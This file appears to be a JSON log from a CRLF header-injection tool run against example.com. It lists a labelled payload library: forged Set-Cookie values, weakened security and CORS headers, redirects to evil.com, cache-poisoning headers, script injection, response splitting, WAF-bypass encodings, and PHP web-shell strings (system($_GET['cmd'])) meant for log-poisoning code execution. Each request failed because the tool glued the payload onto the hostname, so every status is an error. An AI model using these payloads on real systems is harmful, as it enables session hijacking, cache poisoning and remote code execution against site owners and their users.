@@ -1,0 +1,357 @@
+[
+    {
+        "payload": "###############################################",
+        "status": "ERROR: encoding with 'idna' codec failed (UnicodeError: label too long)",
+        "headers": {}
+    },
+    {
+        "payload": "#  CRLF Injection Payload Library \u2013 v2.0",
+        "status": "ERROR: encoding with 'idna' codec failed (UnicodeError: label empty or too long)",
+        "headers": {}
+    },
+    {
+        "payload": "#  Author: Gray (Subir) \u2013 CRLF Injector Project",
+        "status": "ERROR: encoding with 'idna' codec failed (UnicodeError: label too long)",
+        "headers": {}
+    },
+    {
+        "payload": "###############################################",
+        "status": "ERROR: encoding with 'idna' codec failed (UnicodeError: label too long)",
+        "headers": {}
+    },
+    {
+        "payload": "########## 1. BASIC COOKIE INJECTION ##########",
+        "status": "ERROR: Cannot connect to host example.com%23%23%23%23%23%23%23%23%23%23%201.%20basic%20cookie%20injection%20%23%23%23%23%23%23%23%23%23%23:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "Set-Cookie: hacker=owned",
+        "status": "ERROR: Cannot connect to host example.comset-cookie%3a%20hacker%3downed:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "Set-Cookie: admin=true",
+        "status": "ERROR: Cannot connect to host example.comset-cookie%3a%20admin%3dtrue:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "Set-Cookie: session=pwned",
+        "status": "ERROR: Cannot connect to host example.comset-cookie%3a%20session%3dpwned:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "Set-Cookie: role=superuser",
+        "status": "ERROR: Cannot connect to host example.comset-cookie%3a%20role%3dsuperuser:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "########## 2. SECURITY HEADER OVERRIDES ##########",
+        "status": "ERROR: encoding with 'idna' codec failed (UnicodeError: label too long)",
+        "headers": {}
+    },
+    {
+        "payload": "X-Frame-Options: ALLOWALL",
+        "status": "ERROR: Cannot connect to host example.comx-frame-options%3a%20allowall:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "X-Content-Type-Options: insecure",
+        "status": "ERROR: Cannot connect to host example.comx-content-type-options%3a%20insecure:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "X-XSS-Protection: 0",
+        "status": "ERROR: Cannot connect to host example.comx-xss-protection%3a%200:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "Referrer-Policy: unsafe-url",
+        "status": "ERROR: Cannot connect to host example.comreferrer-policy%3a%20unsafe-url:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "Strict-Transport-Security: max-age=0",
+        "status": "ERROR: Cannot connect to host example.comstrict-transport-security%3a%20max-age%3d0:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "Content-Security-Policy: unsafe-inline",
+        "status": "ERROR: Cannot connect to host example.comcontent-security-policy%3a%20unsafe-inline:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "Permissions-Policy: interest-cohort=*",
+        "status": "ERROR: Cannot connect to host example.compermissions-policy%3a%20interest-cohort%3d%2a:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "########## 3. CORS MISCONFIG PAYLOADS ##########",
+        "status": "ERROR: Cannot connect to host example.com%23%23%23%23%23%23%23%23%23%23%203.%20cors%20misconfig%20payloads%20%23%23%23%23%23%23%23%23%23%23:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "Access-Control-Allow-Origin: *",
+        "status": "ERROR: Cannot connect to host example.comaccess-control-allow-origin%3a%20%2a:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "Access-Control-Allow-Credentials: true",
+        "status": "ERROR: Cannot connect to host example.comaccess-control-allow-credentials%3a%20true:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "Access-Control-Allow-Methods: GET,POST,OPTIONS",
+        "status": "ERROR: Cannot connect to host example.comaccess-control-allow-methods%3a%20get%2cpost%2coptions:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "Access-Control-Max-Age: 999999",
+        "status": "ERROR: Cannot connect to host example.comaccess-control-max-age%3a%20999999:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "########## 4. REDIRECTION PAYLOADS ##########",
+        "status": "ERROR: Cannot connect to host example.com%23%23%23%23%23%23%23%23%23%23%204.%20redirection%20payloads%20%23%23%23%23%23%23%23%23%23%23:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "Location: https://evil.com",
+        "status": "ERROR: Cannot connect to host example.comlocation%3a%20https%3a:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "Location: http://attacker.test",
+        "status": "ERROR: Cannot connect to host example.comlocation%3a%20http%3a:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "Location: javascript:alert('XSS')",
+        "status": "ERROR: Cannot connect to host example.comlocation%3a%20javascript%3aalert%28%27xss%27%29:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "Location: //evil.com",
+        "status": "ERROR: Cannot connect to host example.comlocation%3a%20:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "########## 5. CACHE POISONING ##########",
+        "status": "ERROR: Cannot connect to host example.com%23%23%23%23%23%23%23%23%23%23%205.%20cache%20poisoning%20%23%23%23%23%23%23%23%23%23%23:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "Cache-Control: public,max-age=999999",
+        "status": "ERROR: Cannot connect to host example.comcache-control%3a%20public%2cmax-age%3d999999:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "X-Cache: HIT",
+        "status": "ERROR: Cannot connect to host example.comx-cache%3a%20hit:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "Surrogate-Control: max-age=999999",
+        "status": "ERROR: Cannot connect to host example.comsurrogate-control%3a%20max-age%3d999999:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "Age: 0",
+        "status": "ERROR: Cannot connect to host example.comage%3a%200:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "Expires: Wed, 21 Oct 2050 07:28:00 GMT",
+        "status": "ERROR: Cannot connect to host example.comexpires%3a%20wed%2c%2021%20oct%202050%2007%3a28%3a00%20gmt:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "########## 6. HTML / BODY INJECTION ##########",
+        "status": "ERROR: Cannot connect to host example.com%23%23%23%23%23%23%23%23%23%23%206.%20html%20:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "Content-Type: text/html",
+        "status": "ERROR: Cannot connect to host example.comcontent-type%3a%20text:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "<h1>Injected by CRLF Exploit</h1>",
+        "status": "ERROR: Cannot connect to host example.com%3ch1%3einjected%20by%20crlf%20exploit%3c:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "<script>alert('Header Injection')</script>",
+        "status": "ERROR: Cannot connect to host example.com%3cscript%3ealert%28%27header%20injection%27%29%3c:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "########## 7. LOG POISONING (RCE CHAINS) ##########",
+        "status": "ERROR: encoding with 'idna' codec failed (UnicodeError: label too long)",
+        "headers": {}
+    },
+    {
+        "payload": "User-Agent: <?php system($_GET['cmd']); ?>",
+        "status": "ERROR: encoding with 'idna' codec failed (UnicodeError: label too long)",
+        "headers": {}
+    },
+    {
+        "payload": "User-Agent: <?php echo shell_exec($_GET['cmd']); ?>",
+        "status": "ERROR: encoding with 'idna' codec failed (UnicodeError: label too long)",
+        "headers": {}
+    },
+    {
+        "payload": "User-Agent: <script>alert('XSS')</script>",
+        "status": "ERROR: Cannot connect to host example.comuser-agent%3a%20%3cscript%3ealert%28%27xss%27%29%3c:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "User-Agent: curl-pwned-by-Gray",
+        "status": "ERROR: Cannot connect to host example.comuser-agent%3a%20curl-pwned-by-gray:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "########## 8. RESPONSE SPLITTING ##########",
+        "status": "ERROR: Cannot connect to host example.com%23%23%23%23%23%23%23%23%23%23%208.%20response%20splitting%20%23%23%23%23%23%23%23%23%23%23:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "HTTP/1.1 200 OK",
+        "status": "ERROR: Cannot connect to host example.comhttp:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "Content-Type: text/html",
+        "status": "ERROR: Cannot connect to host example.comcontent-type%3a%20text:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "<h2>Split Response Successful</h2>",
+        "status": "ERROR: Cannot connect to host example.com%3ch2%3esplit%20response%20successful%3c:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "HTTP/1.1 302 Found",
+        "status": "ERROR: Cannot connect to host example.comhttp:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "Location: https://evil.com",
+        "status": "ERROR: Cannot connect to host example.comlocation%3a%20https%3a:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "########## 9. WAF/IDS BYPASS PAYLOADS ##########",
+        "status": "ERROR: Cannot connect to host example.com%23%23%23%23%23%23%23%23%23%23%209.%20waf:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "Set-Cookie:%20bypass=1",
+        "status": "ERROR: Cannot connect to host example.comset-cookie%3a%2520bypass%3d1:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "Set-Cookie:+tabbed=ok",
+        "status": "ERROR: Cannot connect to host example.comset-cookie%3a%2btabbed%3dok:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "Set-Cookie:%09tab_char",
+        "status": "ERROR: Cannot connect to host example.comset-cookie%3a%2509tab_char:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "X-Test:%0AInjected",
+        "status": "ERROR: Cannot connect to host example.comx-test%3a%250ainjected:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "Injected:%0D%0ASet-Cookie:WAF=Bypassed",
+        "status": "ERROR: Cannot connect to host example.cominjected%3a%250d%250aset-cookie%3awaf%3dbypassed:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "########## 10. MULTI\u2011HEADER CHAINS ##########",
+        "status": "ERROR: encoding with 'idna' codec failed (UnicodeError: label too long)",
+        "headers": {}
+    },
+    {
+        "payload": "Set-Cookie: session=owned",
+        "status": "ERROR: Cannot connect to host example.comset-cookie%3a%20session%3downed:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "Access-Control-Allow-Origin: *",
+        "status": "ERROR: Cannot connect to host example.comaccess-control-allow-origin%3a%20%2a:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "Cache-Control: public,max-age=9999",
+        "status": "ERROR: Cannot connect to host example.comcache-control%3a%20public%2cmax-age%3d9999:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "Set-Cookie: admin=true",
+        "status": "ERROR: Cannot connect to host example.comset-cookie%3a%20admin%3dtrue:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "X-Frame-Options: ALLOWALL",
+        "status": "ERROR: Cannot connect to host example.comx-frame-options%3a%20allowall:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "X-XSS-Protection: 0",
+        "status": "ERROR: Cannot connect to host example.comx-xss-protection%3a%200:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "########## 11. ADVANCED CHAINED EXPLOITS ##########",
+        "status": "ERROR: encoding with 'idna' codec failed (UnicodeError: label too long)",
+        "headers": {}
+    },
+    {
+        "payload": "Content-Type: text/html",
+        "status": "ERROR: Cannot connect to host example.comcontent-type%3a%20text:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "X-Frame-Options: ALLOWALL",
+        "status": "ERROR: Cannot connect to host example.comx-frame-options%3a%20allowall:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "X-Content-Type-Options: insecure",
+        "status": "ERROR: Cannot connect to host example.comx-content-type-options%3a%20insecure:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "<h1>Advanced Chain Executed</h1>",
+        "status": "ERROR: Cannot connect to host example.com%3ch1%3eadvanced%20chain%20executed%3c:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "########## 12. DEBUG / SERVERTOKEN CORRUPTION ##########",
+        "status": "ERROR: Cannot connect to host example.com%23%23%23%23%23%23%23%23%23%23%2012.%20debug%20:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "Server: Apache",
+        "status": "ERROR: Cannot connect to host example.comserver%3a%20apache:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "Server: Nginx",
+        "status": "ERROR: Cannot connect to host example.comserver%3a%20nginx:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "Server: GrayInjector",
+        "status": "ERROR: Cannot connect to host example.comserver%3a%20grayinjector:443 ssl:default [Name or service not known]",
+        "headers": {}
+    },
+    {
+        "payload": "X-Powered-By: PHP/999.0",
+        "status": "ERROR: Cannot connect to host example.comx-powered-by%3a%20php:443 ssl:default [Name or service not known]",
+        "headers": {}
+    }
+]
